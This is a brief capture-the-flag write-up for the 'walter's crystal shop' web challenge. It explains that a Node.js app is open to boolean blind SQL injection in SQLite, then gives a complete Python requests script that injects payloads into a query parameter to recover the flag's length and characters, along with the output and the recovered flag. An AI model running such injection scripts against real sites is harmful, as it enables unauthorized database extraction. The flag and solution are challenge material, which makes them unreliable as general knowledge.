<h1> walter's crystal shop </h1>


<p> This web challenge is a Nodejs web application that is vulnerable to blind SQL injection in SQLite.
 We can retrieve the flag with a boolean blind sql, and automate the process in python with the reqests library. </p>

```python
import requests


char = [chr(l) for l in range(65,91)] + [chr(l) for l in range(97,123)] + [str(l) for l in range(0,9)] + ["{", "}", "_", "@", "#", "$", "%",]

url = "https://walters-crystal-shop.chal.nbctf.com/crystals?name=Amethyst"
s = requests.Session()


def get_length(s, url) -> int:
    for n in range(100):
        payload = f"'and (SELECT length(flag) FROM flag) = {n}--"
        urlVuln = url + payload

        page = s.get(urlVuln).text

        if page.find('Amethyst') != -1:
            print('Length : ', n)
            return n

def get_flag(s, url, char, length) -> str:
    flag = ""
    for n in range(length + 1):
        for c in char:
            payload = f"'and (SELECT hex(substr(flag,{n},1)) FROM flag) = hex('{c}')--'"
            urlVuln = url + payload

            page = s.get(urlVuln).text

            if page.find('Amethyst') != -1:
                flag += c
                print(flag)
                break
    return flag


length = get_length(s, url)
flag = get_flag(s, url, char, length)
print(flag)
```

<p> And we get the flag ! </p>

```
Length : 61
nb
nbc
nbct
nbctf
nbctf{
nbctf{h
nbctf{h0
nbctf{h0p

...

nbctf{h0p3fuLLy_7h3_D3A_d035n7_kn0w_ab0ut_th3_0th3r_cRyst4l5
nbctf{h0p3fuLLy_7h3_D3A_d035n7_kn0w_ab0ut_th3_0th3r_cRyst4l5}
nbctf{h0p3fuLLy_7h3_D3A_d035n7_kn0w_ab0ut_th3_0th3r_cRyst4l5}
```
